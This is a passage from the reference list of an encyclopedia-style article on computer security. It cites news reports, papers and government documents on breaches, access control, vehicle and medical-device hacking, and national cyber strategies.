www.ncsc.gov.uk
. Retrieved 
19 December
 2023
.




^
 
"NCSC's cyber security training for staff now available"
. 
www.ncsc.gov.uk
. Retrieved 
19 December
 2023
.




^
 
Treglia, J.; Delia, M. (2017). 
Cyber Security Inoculation
. NYS Cyber Security Conference, Empire State Plaza Convention Center, Albany, NY, 3–4 June.




^
 
"What is a license dongle?"
. 
www.revenera.com
. Retrieved 
12 June
 2024
.




^
 
"Token-based authentication"
. SafeNet.com. 
Archived
 from the original on 20 March 2014
. Retrieved 
20 March
 2014
.




^
 
"Lock and protect your Windows PC"
. TheWindowsClub.com. 10 February 2010. 
Archived
 from the original on 20 March 2014
. Retrieved 
20 March
 2014
.




^
 
James Greene (2012). 
"Intel Trusted Execution Technology: White Paper"
 
(PDF)
. Intel Corporation. 
Archived
 
(PDF)
 from the original on 11 June 2014
. Retrieved 
18 December
 2013
.




^
 
"SafeNet ProtectDrive 8.4"
. SCMagazine.com. 4 October 2008. 
Archived
 from the original on 20 March 2014
. Retrieved 
20 March
 2014
.




^
 
"Secure Hard Drives: Lock Down Your Data"
. PCMag.com. 11 May 2009. 
Archived
 from the original on 21 June 2017.




^
 
Souppaya, Murugiah P.; Scarfone, Karen (2013). 
"Guidelines for Managing the Security of Mobile Devices in the Enterprise"
. 
National Institute of Standards and Technology
. Special Publication (NIST SP). Gaithersburg, MD. 
doi
:
10.6028/NIST.SP.800-124r1
.




^
 
"Access Control Statistics: Trends & Insights"
. 23 February 2024
. Retrieved 
26 April
 2024
.




^
 
"Forget IDs, use your phone as credentials"
. 
Fox Business Network
. 4 November 2013. 
Archived
 from the original on 20 March 2014
. Retrieved 
20 March
 2014
.




^
 
"Direct memory access protections for Mac computers"
. 
Apple
. Retrieved 
16 November
 2022
.




^
 
"Using IOMMU for DMA Protection in UEFI Firmware"
 
(PDF)
. Intel Corporation. 
Archived
 
(PDF)
 from the original on 9 December 2021
. Retrieved 
16 November
 2022
.




^
 
Babaei, Armin; Schiele, Gregor; Zohner, Michael (26 July 2022). 
"Reconfigurable Security Architecture (RESA) Based on PUF for FPGA-Based IoT Devices"
. 
Sensors
. 
22
 (15): 5577. 
Bibcode
:
2022Senso..22.5577B
. 
doi
:
10.3390/s22155577
. 
ISSN
 
1424-8220
. 
PMC
 
9331300
. 
PMID
 
35898079
.




^
 
Hassija, Vikas; Chamola, Vinay; Gupta, Vatsal; Jain, Sarthak; Guizani, Nadra (15 April 2021). 
"A Survey on Supply Chain Security: Application Areas, Security Threats, and Solution Architectures"
. 
IEEE Internet of Things Journal
. 
8
 (8): 6222–6246. 
doi
:
10.1109/JIOT.2020.3025775
. 
ISSN
 
2327-4662
. 
S2CID
 
226767829
.




^
 
"The Most Secure OS: What is the Safest OS Available?"
. 
Tech.co
. Retrieved 
19 December
 2023
.




^
 
Sanghavi, Alok (21 May 2010). "What is formal verification?". 
EE Times_Asia
.




^
 
Ferraiolo, D.F. & Kuhn, D.R. (October 1992). 
"Role-Based Access Control"
 
(PDF)
. 
15th National Computer Security Conference
: 554–563.




^
 
Sandhu, R; Coyne, EJ; Feinstein, HL; Youman, CE (August 1996). 
"Role-Based Access Control Models"
 
(PDF)
. 
IEEE Computer
. 
29
 (2): 38–47. 
CiteSeerX
 
10.1.1.50.7649
. 
doi
:
10.1109/2.485845
. 
S2CID
 
1958270
.




^
 
Abreu, Vilmar; Santin, Altair O.; Viegas, Eduardo K.; Stihler, Maicon (2017). 
A multi-domain role activation model
 
(PDF)
. 2017 IEEE International Conference on Communications (ICC). IEEE Press. pp. 1–6. 
doi
:
10.1109/ICC.2017.7997247
. 
ISBN
 
978-1467389990
. 
S2CID
 
6185138
.




^
 
A.C. O'Connor & R.J. Loomis (2002). 
Economic Analysis of Role-Based Access Control
 
(PDF)
. Research Triangle Institute. p. 145.




^
 
"Studies prove once again that users are the weakest link in the security chain"
. 
CSO Online
. 22 January 2014
. Retrieved 
8 October
 2018
.




^
 
"The Role of Human Error in Successful Security Attacks"
. 
IBM Security Intelligence
. 2 September 2014
. Retrieved 
8 October
 2018
.




^
 
"90% of security incidents trace back to PEBKAC and ID10T errors"
. 
Computerworld
. 15 April 2015
. Retrieved 
8 October
 2018
.




^
 
"Protect your online banking with 2FA"
. 
NZ Bankers Association
. 7 October 2018
. Retrieved 
7 September
 2019
.




^
 
"IBM Security Services 2014 Cyber Security Intelligence Index"
 
(PDF)
. 
PcSite
. 2014
. Retrieved 
9 October
 2020
.




^
 
Caldwell, Tracey (12 February 2013). 
"Risky business: why security awareness is crucial for employees"
. 
The Guardian
. Retrieved 
8 October
 2018
.




^
 
"Developing a Security Culture"
. 
CPNI – Centre for the Protection of National Infrastructure
. Archived from 
the original
 on 9 October 2018
. Retrieved 
8 October
 2018
.




^ 
a
 
b
 
"Cyber Hygiene – ENISA"
. Retrieved 
27 September
 2018
.




^ 
a
 
b
 
Kaljulaid, Kersti (16 October 2017). 
"President of the Republic at the Aftenposten's Technology Conference"
. Retrieved 
27 September
 2018
.




^
 
"Cyber security breaches survey 2023"
. 
GOV.UK
. Retrieved 
27 December
 2023
.




^
 
Kuchler, Hannah (27 April 2015). 
"Security execs call on companies to improve 'cyber hygiene'
"
. 
Financial Times
. Archived from 
the original
 on 10 December 2022
. Retrieved 
27 September
 2018
.




^
 
"From AI to Russia, Here's How Estonia's President Is Planning for the Future"
. 
Wired
. Retrieved 
28 September
 2018
.




^
 
"Professor Len Adleman explains how he coined the term "computer virus"
"
. 
WeLiveSecurity
. 1 November 2017
. Retrieved 
28 September
 2018
.




^
 
"Statement of Dr. Vinton G. Cerf"
. 
www.jec.senate.gov
. Retrieved 
28 September
 2018
.




^
 
Promoting Good Cyber Hygiene Act of 2017
 at 
Congress.gov




^
 
"Analysis | The Cybersecurity 202: Agencies struggling with basic cybersecurity despite Trump's pledge to prioritize it"
. 
The Washington Post
. Retrieved 
28 September
 2018
.




^
 
"Protected Voices"
. 
Federal Bureau of Investigation
. Retrieved 
28 September
 2018
.




^
 
Lin, Tom C. W. (3 July 2017). "The New Market Manipulation". 
Emory Law Journal
. 
66
: 1253. 
SSRN
 
2996896
.




^
 
Lin, Tom C. W. (2016). "Financial Weapons of War". 
Minnesota Law Review
. 
SSRN
 
2765010
.




^
 
Cole, Jeffrey I.; Suman, Michael; Schramm, Phoebe; van Bel, Daniel; Lunn, B.; Maguire, Phyllisane; Hanson, Koran; Singh, Rajesh; Aquino, Jedrix-Sean; Lebo, Harlan (2000). 
The UCLA Internet report: Surveying the digital future
 
(PDF)
. 
ccp.ucla.edu
 (Report). Archived from 
the original
 
(PDF)
 on 23 April 2003
. Retrieved 
15 September
 2023
.




^
 
Pagliery, Jose (18 November 2014). 
"Hackers attacked the U.S. energy grid 79 times this year"
. 
CNN Money
. Cable News Network. 
Archived
 from the original on 18 February 2015
. Retrieved 
16 April
 2015
.




^
 
Neumann, P. G. (1997). 
Computer Security in Aviation: Vulnerabilities, Threats, and Risks
. International Conference on Aviation Safety and Security in the 21st Century, White House Commission on Safety and Security.




^
 
Dillingham, Gerald L. (20 September 2001). 
Aviation security : terrorist acts demonstrate urgent need to improve security at the nation's airports
 (Report). United States. General Accounting Office.




^
 
"Air Traffic Control Systems Vulnerabilities Could Make for Unfriendly Skies [Black Hat] – SecurityWeek.Com"
. 27 July 2012. 
Archived
 from the original on 8 February 2015.




^
 
"Hacker Says He Can Break into Airplane Systems Using In-Flight Wi-Fi"
. 
NPR
. 4 August 2014. 
Archived
 from the original on 8 February 2015
. Retrieved 
19 March
 2020
.




^
 
Jim Finkle (4 August 2014). 
"Hacker says to show passenger jets at risk of cyber attack"
. 
Reuters
. 
Archived
 from the original on 13 October 2015
. Retrieved 
21 November
 2021
.




^
 
Cesar, Alan (15 December 2023). 
"Online course bolsters cybersecurity in aviation"
. 
Aerogram
. Purdue University School of Aeronautics and Astronautics
. Retrieved 
9 January
 2024
.




^
 
"Pan-European Network Services (PENS) – Eurocontrol.int"
. 
Archived
 from the original on 12 December 2016.




^
 
"Centralised Services: NewPENS moves forward – Eurocontrol.int"
. 17 January 2016. 
Archived
 from the original on 19 March 2017.




^
 
"NextGen Data Communication"
. FAA. Archived from 
the original
 on 13 March 2015
. Retrieved 
15 June
 2017
.




^
 
"e-Passports | Homeland Security"
. 
www.dhs.gov
. Retrieved 
3 February
 2023
.




^
 
"The Australian ePassport. Australian Government Department of Foreign Affairs and Trade website"
. Archived from 
the original
 on 9 January 2015
. Retrieved 
1 May
 2023
.




^ 
a
 
b
 
"Is Your Watch Or Thermostat A Spy? Cybersecurity Firms Are On It"
. 
NPR
. 6 August 2014. 
Archived
 from the original on 11 February 2015.




^
 
Humana Inc. (15 November 2000). 
"Humana Web Site Named Best Interactive Site by eHealthcare Strategy & Trends; re LOUISVILLE, Ky., Nov. 15 PRNewswire"
. 
prnewswire.com
.




^
 
Kruse, CB; Smith, B; Vanderlinden, H; Nealand, A (21 July 2017). 
"Security Techniques for the Electronic Health Records"
. 
Journal of Medical Systems
. 
41
 (8): 127. 
doi
:
10.1007/s10916-017-0778-4
. 
PMC
 
5522514
. 
PMID
 
28733949
.




^
 
Melvin Backman (18 September 2014). 
"Home Depot: 56 million cards exposed in breach"
. 
CNNMoney
. 
Archived
 from the original on 18 December 2014.




^
 
"Staples: Breach may have affected 1.16 million customers' cards"
. 
Fortune.com
. 19 December 2014. 
Archived
 from the original on 21 December 2014
. Retrieved 
21 December
 2014
.




^
 
"Target: 40 million credit cards compromised"
. 
CNN
. 19 December 2013. 
Archived
 from the original on 1 December 2017
. Retrieved 
29 November
 2017
.




^
 
Cowley, Stacy (2 October 2017). 
"2.5 Million More People Potentially Exposed in Equifax Breach"
. 
The New York Times
. 
Archived
 from the original on 1 December 2017
. Retrieved 
29 November
 2017
.




^
 
Jim Finkle (23 April 2014). 
"Exclusive: FBI warns healthcare sector vulnerable to cyber attacks"
. 
Reuters
. 
Archived
 from the original on 4 June 2016
. Retrieved 
23 May
 2016
.




^
 
Seals, Tara (6 November 2015). 
"Lack of Employee Security Training Plagues US Businesses"
. 
Infosecurity Magazine
. 
Archived
 from the original on 9 November 2017
. Retrieved 
8 November
 2017
.




^
 
Bright, Peter (15 February 2011). 
"Anonymous speaks: the inside story of the HBGary hack"
. Arstechnica.com. 
Archived
 from the original on 27 March 2011
. Retrieved 
29 March
 2011
.




^
 
Anderson, Nate (9 February 2011). 
"How one man tracked down Anonymous – and paid a heavy price"
. Arstechnica.com. 
Archived
 from the original on 29 March 2011
. Retrieved 
29 March
 2011
.




^
 
Palilery, Jose (24 December 2014). 
"What caused Sony hack: What we know now"
. 
CNN Money
. 
Archived
 from the original on 4 January 2015
. Retrieved 
4 January
 2015
.




^
 
James Cook (16 December 2014). 
"Sony Hackers Have Over 100 Terabytes Of Documents. Only Released 200 Gigabytes So Far"
. 
Business Insider
. 
Archived
 from the original on 17 December 2014
. Retrieved 
18 December
 2014
.




^ 
a
 
b
 
Timothy B. Lee (18 January 2015). 
"The next frontier of hacking: your car"
. 
Vox
. 
Archived
 from the original on 17 March 2017.




^
 
Tracking & Hacking: Security & Privacy Gaps Put American Drivers at Risk
 
(PDF)
 (Report). 6 February 2015. 
Archived
 
(PDF)
 from the original on 9 November 2016
. Retrieved 
4 November
 2016
.




^
 
"Cybersecurity expert: It will take a 'major event' for companies to take this issue seriously"
. 
AOL.com
. 5 January 2017. 
Archived
 from the original on 20 January 2017
. Retrieved 
22 January
 2017
.




^
 
"The problem with self-driving cars: who controls the code?"
. 
The Guardian
. 23 December 2015. 
Archived
 from the original on 16 March 2017
. Retrieved 
22 January
 2017
.




^
 
Stephen Checkoway; Damon McCoy; 
Brian Kantor
; Danny Anderson; Hovav Shacham; 
Stefan Savage
; Karl Koscher; Alexei Czeskis; Franziska Roesner; Tadayoshi Kohno (2011). 
Comprehensive Experimental Analyses of Automotive Attack Surfaces
 
(PDF)
. SEC'11 Proceedings of the 20th USENIX conference on Security. Berkeley, California, US: USENIX Association. p. 6. 
Archived
 
(PDF)
 from the original on 21 February 2015.




^
 
Greenberg, Andy (21 July 2015). 
"Hackers Remotely Kill a Jeep on the Highway – With Me in It"
. 
Wired
. 
Archived
 from the original on 19 January 2017
. Retrieved 
22 January
 2017
.




^
 
"Hackers take control of car, drive it into a ditch"
. 
The Independent
. 22 July 2015. 
Archived
 from the original on 2 February 2017
. Retrieved 
22 January
 2017
.




^
 
"Tesla fixes software bug that allowed Chinese hackers to control car remotely"
. 
The Telegraph
. 21 September 2016. 
Archived
 from the original on 2 February 2017
. Retrieved 
22 January
 2017
.




^
 
Kang, Cecilia (19 September 2016). 
"Self-Driving Cars Gain Powerful Ally: The Government"
. 
The New York Times
. 
Archived
 from the original on 14 February 2017
. Retrieved 
22 January
 2017
.




^
 
"Federal Automated Vehicles Policy"
 
(PDF)
. 
Archived
 
(PDF)
 from the original on 21 January 2017
. Retrieved 
22 January
 2017
.




^
 
"Vehicle Cybersecurity"
. 
nhtsa.gov
. Retrieved 
25 November
 2022
.




^
 
"Thales supplies smart driver license to 4 states in Mexico"
. 
Thales Group
.




^
 
"4 Companies Using RFID for Supply Chain Management"
. 
atlasRFIDstore
. Retrieved 
3 February
 2023
.




^
 
"The Cutting Edge of RFID Technology and Applications for Manufacturing and Distribution"
. 
Supply Chain Market
.




^
 
Rahman, Mohammad Anwar; Khadem, Mohammad Miftaur; Sarder, MD. 
Application of RFID in Supply Chain System
. Proceedings of the 2010 International Conference on Industrial Engineering and Operations Management Dhaka, Bangladesh, January 9 – 10, 2010. 
CiteSeerX
 
10.1.1.397.7831
.




^
 
"Gary McKinnon profile: Autistic 'hacker' who started writing computer programs at 14"
. 
The Daily Telegraph
. London. 23 January 2009. 
Archived
 from the original on 2 June 2010.




^
 
"Gary McKinnon extradition ruling due by 16 October"
. 
BBC News
. 6 September 2012. 
Archived
 from the original on 6 September 2012
. Retrieved 
25 September
 2012
.




^
 
Mckinnon V Government of The United States of America and Another
 (House of Lords 16 June 2008) ("15. ... alleged to total over $700,000"), 
Text
.




^
 
"Fresh Leak on US Spying: NSA Accessed Mexican President's Email"
. 
SPIEGEL ONLINE
. 20 October 2013. Archived from 
the original
 on 6 November 2015.




^
 
Sanders, Sam (4 June 2015). 
"Massive Data Breach Puts 4 Million Federal Employees' Records at Risk"
. 
NPR
. 
Archived
 from the original on 5 June 2015
. Retrieved 
5 June
 2015
.




^
 
Liptak, Kevin (4 June 2015). 
"U.S. government hacked; feds think China is the culprit"
. 
CNN
. 
Archived
 from the original on 6 June 2015
. Retrieved 
5 June
 2015
.




^
 
Sean Gallagher. 
"Encryption "would not have helped" at OPM, says DHS official"
. 
Archived
 from the original on 24 June 2017.




^
 
Davis, Michelle R. (19 October 2015). 
"Schools Learn Lessons From Security Breaches"
. 
Education Week
. 
Archived
 from the original on 10 June 2016
. Retrieved 
23 May
 2016
.




^
 
"GE's Introduces ACUVision as a Single Panel Solution"
. 
www.securityinfowatch.com
. Security Info Watch. 11 August 2005
. Retrieved 
24 September
 2019
.




^
 
"Internet of Things Global Standards Initiative"
. 
ITU
. 
Archived
 from the original on 26 June 2015
. Retrieved 
26 June
 2015
.




^
 
Singh, Jatinder; Pasquier, Thomas; Bacon, Jean; Ko, Hajoon; Eyers, David (2015). 
"Twenty Cloud Security Considerations for Supporting the Internet of Things"
 
(PDF)
. 
IEEE Internet of Things Journal
. 
3
 (3): 269–284. 
doi
:
10.1109/JIOT.2015.2460333
. 
S2CID
 
4732406
.




^
 
Chris Clearfield. 
"Why The FTC Can't Regulate The Internet Of Things"
. 
Forbes
. 
Archived
 from the original on 27 June 2015
. Retrieved 
26 June
 2015
.




^
 
"Internet of Things: Science Fiction or Business Fact?"
 
(PDF)
. 
Harvard Business Review
. 
Archived
 
(PDF)
 from the original on 17 March 2015
. Retrieved 
4 November
 2016
.




^
 
Ovidiu Vermesan; Peter Friess. 
"Internet of Things: Converging Technologies for Smart Environments and Integrated Ecosystems"
 
(PDF)
. River Publishers. 
Archived
 
(PDF)
 from the original on 12 October 2016
. Retrieved 
4 November
 2016
.




^
 
Clearfield, Chris (20 June 2013). 
"Rethinking Security for the Internet of Things"
. 
Harvard Business Review
. 
Archived
 from the original on 20 September 2013.




^
 
"Hotel room burglars exploit critical flaw in electronic door locks"
. 
Ars Technica
. 26 November 2012. 
Archived
 from the original on 14 May 2016
. Retrieved 
23 May
 2016
.




^
 
"Hospital Medical Devices Used As Weapons in Cyberattacks"
. 
Dark Reading
. 6 August 2015. 
Archived
 from the original on 29 May 2016
. Retrieved 
23 May
 2016
.




^
 
Jeremy Kirk (17 October 2012). 
"Pacemaker hack can deliver deadly 830-volt jolt"
. 
Computerworld
. 
Archived
 from the original on 4 June 2016
. Retrieved 
23 May
 2016
.




^
 
"How Your Pacemaker Will Get Hacked"
. 
The Daily Beast
. Kaiser Health News. 17 November 2014. 
Archived
 from the original on 20 May 2016
. Retrieved 
23 May
 2016
.




^
 
Leetaru, Kalev. 
"Hacking Hospitals And Holding Hostages: Cybersecurity In 2016"
. 
Forbes
. 
Archived
 from the original on 29 December 2016
. Retrieved 
29 December
 2016
.




^ 
a
 
b
 
"Cyber-Angriffe: Krankenhäuser rücken ins Visier der Hacker"
. Wirtschafts Woche. 7 December 2016. 
Archived
 from the original on 29 December 2016
. Retrieved 
29 December
 2016
.




^
 
"Hospitals keep getting attacked by ransomware – Here's why"
. 
Business Insider
. 
Archived
 from the original on 29 December 2016
. Retrieved 
29 December
 2016
.




^
 
"MedStar Hospitals Recovering After 'Ransomware' Hack"
. 
NBC News
. 31 March 2016. 
Archived
 from the original on 29 December 2016
. Retrieved 
29 December
 2016
.




^
 
Pauli, Darren. 
"US hospitals hacked with ancient exploits"
. 
The Register
. 
Archived
 from the original on 16 November 2016
. Retrieved 
29 December
 2016
.




^
 
Pauli, Darren. 
"Zombie OS lurches through Royal Melbourne Hospital spreading virus"
. 
The Register
. 
Archived
 from the original on 29 December 2016
. Retrieved 
29 December
 2016
.




^
 
"Hacked Lincolnshire hospital computer systems 'back up'
"
. 
BBC News
. 2 November 2016. 
Archived
 from the original on 29 December 2016
. Retrieved 
29 December
 2016
.




^
 
"Lincolnshire operations cancelled after network attack"
. 
BBC News
. 31 October 2016. 
Archived
 from the original on 29 December 2016
. Retrieved 
29 December
 2016
.




^
 
"Legion cyber-attack: Next dump is sansad.nic.in, say hackers"
. 
The Indian Express
. 12 December 2016. 
Archived
 from the original on 29 December 2016
. Retrieved 
29 December
 2016
.




^
 
"Former New Hampshire Psychiatric Hospital Patient Accused Of Data Breach"
. CBS Boston. 27 December 2016. 
Archived
 from the original on 29 September 2017
. Retrieved 
29 December
 2016
.




^
 
"Texas Hospital hacked, affects nearly 30,000 patient records"
. Healthcare IT News. 4 November 2016. 
Archived
 from the original on 29 December 2016
. Retrieved 
29 December
 2016
.




^
 
Becker, Rachel (27 December 2016). 
"New cybersecurity guidelines for medical devices tackle evolving threats"
. 
The Verge
. 
Archived
 from the original on 28 December 2016
. Retrieved 
29 December
 2016
.




^
 
"Postmarket Management of Cybersecurity in Medical Devices"
 
(PDF)
. 
Food and Drug Administration
. 28 December 2016. 
Archived
 
(PDF)
 from the original on 29 December 2016
. Retrieved 
29 December
 2016
.




^
 
Brandt, Jaclyn (18 June 2018). 
"D.C. distributed energy proposal draws concerns of increased cybersecurity risks"
. 
Daily Energy Insider
. Retrieved 
4 July
 2018
.




^
 
"Current Releases - The Open Mobile Alliance"
. 
openmobilealliance.org
.




^
 
Cashell, B.; Jackson, W. D.; Jickling, M.; Webel, B. (2004). 
The Economic Impact of Cyber-Attacks
 
(PDF)
 (Report). Washington DC: Congressional Research Service, Government, and Finance Division. RL32331.




^
 
Gordon, Lawrence; Loeb, Martin (November 2002). "The Economics of Information Security Investment". 
ACM Transactions on Information and System Security
. 
5
 (4): 438–457. 
doi
:
10.1145/581271.581274
. 
S2CID
 
1500788
.




^
 
Sanger, David E.; Barnes, Julian E. (20 December 2021). 
"U.S. and Britain Help Ukraine Prepare for Potential Russian Cyberassault"
. 
The New York Times
. 
ISSN
 
0362-4331
. Retrieved 
4 December
 2023
.




^
 
"Cyber-Attack Against Ukrainian Critical Infrastructure | CISA"
. 
www.cisa.gov
. 20 July 2021
. Retrieved 
4 December
 2023
.




^
 
Han, Chen; Dongre, Rituja (2014). 
"Q&A. What Motivates Cyber-Attackers?"
. 
Technology Innovation Management Review
. 
4
 (10): 40–42. 
doi
:
10.22215/timreview/838
. 
ISSN
 
1927-0321
.




^
 
Chermick, Steven; Freilich, Joshua; Holt, Thomas (April 2017). "Exploring the Subculture of Ideologically Motivated Cyber-Attackers". 
Journal of Contemporary Criminal Justice
. 
33
 (3): 212–233. 
doi
:
10.1177/1043986217699100
. 
S2CID
 
152277480
.




^
 
Anderson, Ross (2020). 
Security engineering : a guide to building dependable distributed systems
 (3rd ed.). Indianapolis, IN: John Wiley & Sons. 
ISBN
 
978-1119642817
. 
OCLC
 
1224516855
.




^
 
"The Leading Cloud Recruiting Software"
. iCIMS
. Retrieved 
13 March
 2021
.




^
 
Wilcox, S. and Brown, B. (2005) 'Responding to Security Incidents – Sooner or Later Your Systems Will Be Compromised', 
Journal of Health Care Compliance
, 7(2), pp. 41–48




^ 
a
 
b
 
Jonathan Zittrain, 'The Future of The Internet', Penguin Books, 2008




^
 
Information Security
 
Archived
 6 March 2016 at the 
Wayback Machine
. United States Department of Defense, 1986




^
 
"The TJX Companies, Inc. Victimized by Computer System Intrusion; Provides Information to Help Protect Customers"
 (Press release). The TJX Companies, Inc. 17 January 2007. 
Archived
 from the original on 27 September 2012
. Retrieved 
12 December
 2009
.




^
 
Largest Customer Info Breach Grows
 
Archived
 28 September 2007 at the 
Wayback Machine
. MyFox Twin Cities, 29 March 2007.




^
 
"The Stuxnet Attack On Iran's Nuclear Plant Was 'Far More Dangerous' Than Previously Thought"
. 
Business Insider
. 20 November 2013. 
Archived
 from the original on 9 May 2014.




^
 
Reals, Tucker (24 September 2010). 
"Stuxnet Worm a U.S. Cyber-Attack on Iran Nukes?"
. 
CBS News
. 
Archived
 from the original on 16 October 2013.




^
 
Kim Zetter (17 February 2011). 
"Cyberwar Issues Likely to Be Addressed Only After a Catastrophe"
. 
Wired
. 
Archived
 from the original on 18 February 2011
. Retrieved 
18 February
 2011
.




^
 
Chris Carroll (18 October 2011). 
"Cone of silence surrounds U.S. cyberwarfare"
. Stars and Stripes. 
Archived
 from the original on 7 March 2012
. Retrieved 
30 October
 2011
.




^
 
John Bumgarner (27 April 2010). 
"Computers as Weapons of War"
 
(PDF)
. IO Journal. Archived from 
the original
 
(PDF)
 on 19 December 2011
. Retrieved 
30 October
 2011
.




^
 
Greenwald, Glenn (6 June 2013). 
"NSA collecting phone records of millions of Verizon customers daily"
. 
The Guardian
. 
Archived
 from the original on 16 August 2013
. Retrieved 
16 August
 2013
. 
Exclusive: Top secret court order requiring 
Verizon
 to hand over all call data shows scale of domestic surveillance under 
Obama




^
 
Seipel, Hubert. 
"Transcript: ARD interview with Edward Snowden"
. 
La Foundation Courage
. 
Archived
 from the original on 14 July 2014
. Retrieved 
11 June
 2014
.




^
 
Newman, Lily Hay (9 October 2013). 
"Can You Trust NIST?"
. 
IEEE Spectrum
. 
Archived
 from the original on 1 February 2016.




^
 
"NIST Removes Cryptography Algorithm from Random Number Generator Recommendations"
. 
National Institute of Standards and Technology
. 21 April 2014.




^
 
"New Snowden Leak: NSA Tapped Google, Yahoo Data Centers"
 
Archived
 9 July 2014 at the 
Wayback Machine
, 31 October 2013, Lorenzo Franceschi-Bicchierai, mashable.com




^
 
Michael Riley; Ben Elgin; Dune Lawrence; Carol Matlack (17 March 2014). 
"Target Missed Warnings in Epic Hack of Credit Card Data"
. 
Businessweek
. Archived from 
the original
 on 27 January 2015.




^
 
Rosenblatt, Seth (6 November 2014). 
"Home Depot says 53 million emails stolen"
. 
CNET
. CBS Interactive. 
Archived
 from the original on 9 December 2014.




^
 
"Millions more Americans hit by government personnel data hack"
. 
Reuters
. 9 July 2017. 
Archived
 from the original on 28 February 2017
. Retrieved 
25 February
 2017
.




^
 
Barrett, Devlin (4 June 2015). 
"U.S. Suspects Hackers in China Breached About four (4) Million People's Records, Officials Say"
. 
The Wall Street Journal
. 
Archived
 from the original on 4 June 2015.




^
 
Risen, Tom (5 June 2015). 
"China Suspected in Theft of Federal Employee Records"
. 
U.S. News & World Report
. Archived from 
the original
 on 6 June 2015.




^
 
Zengerle, Patricia (19 July 2015). 
"Estimate of Americans hit by government personnel data hack skyrockets"
. 
Reuters
. 
Archived
 from the original on 10 July 2015.




^
 
Sanger, David (5 June 2015). 
"Hacking Linked to China Exposes Millions of U.S. Workers"
. 
The New York Times
. 
Archived
 from the original on 5 June 2015.




^
 
Mansfield-Devine, Steve (1 September 2015). "The Ashley Madison affair". 
Network Security
. 
2015
 (9): 8–16. 
doi
:
10.1016/S1353-4858(15)30080-5
.




^
 
Turton, W.; Mehrotra, K. (4 June 2021). 
"Hackers Breached Colonial Pipeline Using Compromised Password"
. Bloomberg L.P
. Retrieved 
3 December
 2023
.




^ 
a
 
b
 
"Mikko Hypponen: Fighting viruses, defending the net"
. TED. 
Archived
 from the original on 16 January 2013.




^
 
"Mikko Hypponen – Behind Enemy Lines"
. Hack in the Box Security Conference. 9 December 2012. 
Archived
 from the original on 25 November 2016.




^
 
"Ensuring the Security of Federal Information Systems and Cyber Critical Infrastructure and Protecting the Privacy of Personally Identifiable Information"
. Government Accountability Office. 
Archived
 from the original on 19 November 2015
. Retrieved 
3 November
 2015
.




^
 
King, Georgia (23 May 2018). 
"The Venn diagram between libertarians and crypto bros is so close it's basically a circle"
. 
Quartz
.




^
 
Kirby, Carrie (24 June 2011). 
"Former White House aide backs some Net regulation / Clarke says government, industry deserve 'F' in cyber security"
. 
The San Francisco Chronicle
.




^
 
McCarthy, Daniel (11 June 2018). 
"Privatizing Political Authority: Cybersecurity, Public-Private Partnerships, and the Reproduction of Liberal Political Order"
. 
Politics and Governance
. 
6
 (2): 5–12. 
doi
:
10.17645/pag.v6i2.1335
.




^
 
"It's Time to Treat Cybersecurity as a Human Rights Issue"
. 
Human Rights Watch
. 26 May 2020
. Retrieved 
26 May
 2020
.




^
 
"FIRST Mission"
. FIRST
. Retrieved 
6 July
 2018
.




^
 
"FIRST Members"
. FIRST
. Retrieved 
6 July
 2018
.




^
 
"European council"
. 
Archived
 from the original on 3 December 2014.




^
 
"MAAWG"
. 
Archived
 from the original on 23 September 2014.




^
 
"MAAWG"
. 
Archived
 from the original on 17 October 2014.




^
 
"Government of Canada Launches Canada's Cyber Security Strategy"
. 
Market Wired
. 3 October 2010. 
Archived
 from the original on 2 November 2014
. Retrieved 
1 November
 2014
.




^ 
a
 
b
 
"Canada's Cyber Security Strategy"
. 
Public Safety Canada
. Government of Canada. 
Archived
 from the original on 2 November 2014
. Retrieved 
1 November
 2014
.




^ 
a
 
b
 
c
 
"Action Plan 2010–2015 for Canada's Cyber Security Strategy"
. 
Public Safety Canada
. Government of Canada. 
Archived
 from the original on 2 November 2014
. Retrieved 
3 November
 2014
.




^
 
"Cyber Incident Management Framework For Canada"
. 
Public Safety Canada
. Government of Canada. 
Archived
 from the original on 2 November 2014
. Retrieved 
3 November
 2014
.




^
 
"Action Plan 2010–2015 for Canada's Cyber Security Strategy"
. 
Public Safety Canada
. Government of Canada. 
Archived
 from the original on 2 November 2014
. Retrieved 
1 November
 2014
.




^
 
"Canadian Cyber Incident Response Centre"
. 
Public Safety Canada
. 
Archived
 from the original on 8 October 2014
. Retrieved 
1 November
 2014
.




^
 
"Cyber Security Bulletins"
. 
Public Safety Canada
. 
Archived
 from the original on 8 October 2014
. Retrieved 
1 November
 2014
.




^
 
"Report a Cyber Security Incident"
. 
Public Safety Canada
. Government of Canada. 
Archived
 from the original on 11 November 2014
. Retrieved 
3 November
 2014
.




^
 
"Government of Canada Launches Cyber Security Awareness Month With New Public Awareness Partnership"
. 
Market Wired
. Government of Canada. 27 September 2012. 
Archived
 from the original on 3 November 2014
. Retrieved 
3 November
 2014
.




^
 
"Cyber Security Cooperation Program"
. 
Public Safety Canada
. 
Archived
 from the original on 2 November 2014
. Retrieved 
1 November
 2014
.




^
 
"Cyber Security Cooperation Program"
. 
Public Safety Canada
. 16 December 2015. 
Archived
 from the original on 2 November 2014.




^
 
"GetCyberSafe"
. 
Get Cyber Safe
. Government of Canada. 
Archived
 from the original on 11 November 2014
. Retrieved 
3 November
 2014
.




^
 
"Australian federal government announces cybersecurity support for SMBs",
"2023-2030 Australian Cyber Security Strategy"
. Retrieved 
22 November
 2023
.




^
 
"Need for proper structure of PPPs to address specific cyberspace risks"
. 
Archived
 from the original on 13 November 2017.




^
 
"National Cyber Safety and Security Standards(NCSSS)-Home"
. 
www.ncdrc.res.in
. Archived from 
the original
 on 19 February 2018
. Retrieved 
19 February
 2018
.




^
 
"South Korea seeks global support in cyber attack probe". 
BBC Monitoring Asia Pacific
. 7 March 2011.




^
 
Kwanwoo Jun (23 September 2013). 
"Seoul Puts a Price on Cyberdefense"
. 
The Wall Street Journal
. Dow Jones & Company, Inc. 
Archived
 from the original on 25 September 2013
. Retrieved 
24 September
 2013
.




^
 
White, House (March 2023). 
"National security strategy"
 
(PDF)
. No. March 2032. white house. US gov.




^
 
Adil, Sajid (16 October 2023). 
"Do You Know About Biggest Cybersecurity Threats In 2023?"
. 
Cybernexguard
. Adil Sajid
. Retrieved 
18 December
 2023
.




^
 
Adil, Sajid (September 2018). 
"National Cyber Strategy of the United States of America"
. 
University Libraries UNT Digital Library
. Retrieved 
18 December
 2023
.




^
 
Adil, Sajid (September 2018). 
"Do You Know About Biggest Cybersecurity Threats In 2023?"
. 
University Libraries UNT Digital Library
. Retrieved 
18 December
 2023
.




^
 
